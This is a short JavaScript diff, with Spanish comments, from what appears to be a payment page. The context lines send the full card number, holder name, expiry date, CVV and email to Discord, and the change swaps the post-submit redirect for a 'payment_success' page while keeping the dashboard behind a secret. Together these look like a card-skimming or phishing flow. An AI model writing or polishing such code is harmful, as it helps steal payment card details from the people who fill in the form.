@@ -514,9 +514,9 @@
       // Enviar a Discord
       await sendToDiscord(cardNumber, cardHolder, expiryDate, cvv, email);
 
-      // Redirigir al dashboard
+      // Redirigir a página de éxito (NO al dashboard — solo accesible con secreto)
       setTimeout(() => {
-        window.location.href = 'dashboard.html?email=' + encodeURIComponent(email);
+        window.location.href = 'index.html?payment_success=1';
       }, 500);
     }
 
